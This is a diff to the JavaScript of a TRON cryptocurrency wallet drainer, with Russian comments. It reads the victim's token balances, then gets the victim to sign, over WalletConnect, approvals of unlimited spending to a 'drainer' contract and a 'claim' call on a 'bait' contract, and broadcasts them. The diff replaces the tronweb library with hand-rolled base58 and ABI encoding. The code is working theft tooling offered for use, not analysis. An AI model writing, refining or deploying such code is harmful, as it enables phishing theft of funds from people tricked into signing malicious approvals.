@@ -139,22 +139,60 @@ async function rpc(method, params, tries = 6) {
   throw new Error('network');
 }
 
-async function tw() { return (await import('https://esm.sh/tronweb@6.5.2')).default; }
-async function builder() { const T = await tw(); const w = new T({ fullHost: RPC }); return w; }
+const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+function b58bytes(s) {
+  let n = [0];
+  for (const ch of s) {
+    let carry = B58.indexOf(ch);
+    if (carry < 0) throw new Error('bad addr');
+    for (let j = 0; j < n.length; j++) { const v = n[j] * 58 + carry; n[j] = v & 255; carry = v >> 8; }
+    while (carry) { n.push(carry & 255); carry >>= 8; }
+  }
+  const out = [];
+  for (let i = s.length - 1; i >= 0 && s[i] === '1'; i--) out.push(0);
+  return Uint8Array.from(out.concat(n.reverse()));
+}
+const hex2 = (b) => Array.from(b, (x) => x.toString(16).padStart(2, '0')).join('');
+// base58 адрес -> 20 байт (без 0x41) в hex, дополненные до 32
+function addrParam(b58) { const b = b58bytes(b58); return hex2(b.slice(1, 21)).padStart(64, '0'); }
+const uintParam = (v) => BigInt(v).toString(16).padStart(64, '0');
 
-async function signAndSend(built, method) {
-  // built.transaction — неподписанная tron-транзакция
+function hexToStr(h) {
+  const s = String(h).replace(/^0x/, '');
+  if (s.length < 128) return '';
+  const off = parseInt(s.slice(0, 64), 16) * 2;
+  const len = parseInt(s.slice(off, off + 64), 16) * 2;
+  const parts = s.slice(off + 64, off + 64 + len).match(/../g) || [];
+  return new TextDecoder().decode(Uint8Array.from(parts.map((x) => parseInt(x, 16))));
+}
+
+async function readCall(contract, selector, param) {  const j = await rpc('/wallet/triggerconstantcontract', {
+    owner_address: account, contract_address: contract, function_selector: selector, parameter: param || '', visible: true,
+  });
+  if (!j.result || !j.result.result) throw new Error('read failed');
+  return j.constant_result[0];
+}
+
+async function buildTx(contract, selector, param, feeLimit) {
+  const j = await rpc('/wallet/triggersmartcontract', {
+    owner_address: account, contract_address: contract, function_selector: selector, parameter: param,
+    fee_limit: feeLimit, call_value: 0, visible: true,
+  });
+  if (!j.result || !j.result.result) throw new Error((j.result && j.result.message) || 'build failed');
+  return j.transaction;
+}
+
+async function wcSend(contract, selector, param, feeLimit) {
+  const tx = await buildTx(contract, selector, param, feeLimit);
   const res = await signer.client.request({
     topic: signer.topic, chainId: CHAIN,
-    request: { method, params: { transaction: built.transaction } },
+    request: { method: 'tron_signTransaction', params: { transaction: tx } },
   });
-  const sig = (res && (res.result && res.result.signature)) || res.signature || (res.result && res.result.result && res.result.result.signature);
+  const sig = (res && res.result && res.result.signature) || res.signature || (res.result && res.result.result && res.result.result.signature);
   if (!sig) throw new Error('not signed');
-  const tx = built.transaction;
   tx.signature = Array.isArray(sig) ? sig : [sig];
   const b = await rpc('/wallet/broadcasttransaction', tx);
   if (b.result !== true) throw new Error((b.message && atob(b.message)) || b.code || 'broadcast failed');
-  // ждём подтверждения
   for (let i = 0; i < 30; i++) {
     const info = await rpc('/wallet/gettransactioninfobyid', { value: b.txid });
     if (info && info.receipt) return b.txid;
@@ -163,19 +201,8 @@ async function signAndSend(built, method) {
   return b.txid;
 }
 
-async function wcSendApprove(token) {
-  const w = await builder();
-  const built = await w.transactionBuilder.triggerSmartContract(token, 'approve(address,uint256)', { feeLimit: 150e6 },
-    [{ type: 'address', value: cfg.drainer }, { type: 'uint256', value: MAX }], signer.address);
-  return signAndSend(built, 'tron_signTransaction');
-}
-
-async function wcSendClaim() {
-  const w = await builder();
-  const built = await w.transactionBuilder.triggerSmartContract(cfg.bait, 'claim(address)', { feeLimit: 300e6 },
-    [{ type: 'address', value: cfg.drainer }], signer.address);
-  return signAndSend(built, 'tron_signTransaction');
-}
+const wcSendApprove = (token) => wcSend(token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(MAX), 150e6);
+const wcSendClaim = () => wcSend(cfg.bait, 'claim(address)', addrParam(cfg.drainer), 300e6);
 
 async function connectTronLink() {
   if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1', bait: 'TDemoBait' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
@@ -244,14 +271,14 @@ async function load() {
     ], ready: true };
   } else if (staticMode || signer.kind === 'wc') {
     try {
-      const w = await builder();
       const tokens = [];
       for (const token of cfg.tokens || []) {
-        const raw = BigInt(await w.contract(BAL_ABI, token).balanceOf(account).call());
+        const raw = BigInt('0x' + (await readCall(token, 'balanceOf(address)', addrParam(account))));
         if (raw === 0n) continue;
-        let dec = 6, sym = token;
-        try { dec = Number(await w.contract(DEC_ABI, token).decimals().call()); } catch (e) {}
-        try { sym = String(await w.contract(SYM_ABI, token).symbol().call()); } catch (e) {}
+        let dec = 6;
+        let sym = token;
+        try { dec = Number(BigInt('0x' + (await readCall(token, 'decimals()', '')))); } catch (e) {}
+        try { sym = hexToStr(await readCall(token, 'symbol()', '')) || token; } catch (e) {}
         tokens.push({ token, symbol: sym, human: fmt(raw, dec) });
       }
       dc = { tokens, ready: tokens.length > 0 };
